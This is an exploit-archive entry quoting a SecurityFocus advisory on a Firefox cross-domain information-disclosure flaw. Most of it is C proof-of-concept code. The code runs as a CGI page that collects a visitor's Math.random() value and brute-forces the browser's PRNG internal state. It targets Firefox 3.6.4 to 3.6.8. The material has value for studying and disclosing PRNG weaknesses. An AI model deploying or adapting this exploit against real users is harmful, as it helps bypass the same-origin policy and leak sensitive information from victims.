source: http://www.securityfocus.com/bid/43222/info

Mozilla Firefox is prone to a cross-domain information-disclosure vulnerability.

An attacker can exploit this issue by tricking an unsuspecting victim into viewing a page containing malicious content.

Successful exploits will allow attackers to bypass the same-origin policy and obtain potentially sensitive information; other attacks are possible. 

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
typedef unsigned long long int uint64;
typedef unsigned int uint32;
#define UINT64(x) (x##ULL)
#define a UINT64(0x5DEECE66D)
#define b UINT64(0xB)
uint64 adv(uint64 x)
{
      return (a*x+b) & ((UINT64(1)<<48)-1);
}
unsigned int  calc(double sample,uint64* state)
{
      int v;
      uint64  sample_int=sample*((double)(UINT64(1)<<53));
      uint32  x1=sample_int>>27;
      uint32  x2=sample_int & ((1<<27)-1);
      uint32  out;
      if ((sample>=1.0) || (sample<0.0))
      {
            // Error - bad input
            return 1;
      }
      for (v=0;v<(1<<22);v++)
      {
            *state=adv((((uint64)x1)<<22)|v);
            out=((*state)>>(48-27))&((1<<27)-1);
            if (out==x2)
            {
                   return 0;
            }
      }
      // Could not find PRNG internal state
      return 2;
}
int main(int argc, char* argv[])
{
      char body[1000]="";
char head[]="\
      <html>\
      <body>\
      <script>\
      document.write('userAgent: '+navigator.userAgent);\
      </script>\
      <br>\
      ";
char tail[]="\
      <form method='GET' onSubmit='f()'>\
      <input type='hidden' name='r'>\
      <input id='x' type='submit' name='dummy'\
            value='Calculate Firefox 3.6.4-3.6.8 PRNG state'>\
      </form>\
      <script>\
      function f()\
      {\
            document.forms[0].r.value=Math.random();\
      }\
      </script>\
      </body>\
      </html>\
      ";
char tail2[]="\
      </body>\
      </html>\
      ";
double r;
char msg[1000];
int rc;
uint64 state;
strcat(body,head);
if (strstr(getenv("QUERY_STRING"),"r=")!=NULL)
{
      sscanf(getenv("QUERY_STRING"),"r=%lf",&r);
      rc=calc(r,&state);
      if (rc==0)
      {
            sprintf(msg,"PRNG state (hex): %012llx\n",state);
            strcat(body,msg);
      }
      else
      {
            sprintf(msg,"Error in calc(): %d\n",rc);
            strcat(body,msg);
      }
      strcat(body,tail2);
}
else
{
      strcat(body,tail);
}
printf("Content-Type: text/html\r\n");
printf("Content-Length: %d\r\n",strlen(body));
  printf("Cache-Control: no-cache\r\n");
  printf("\r\n");
  printf("%s",body);
  return;
}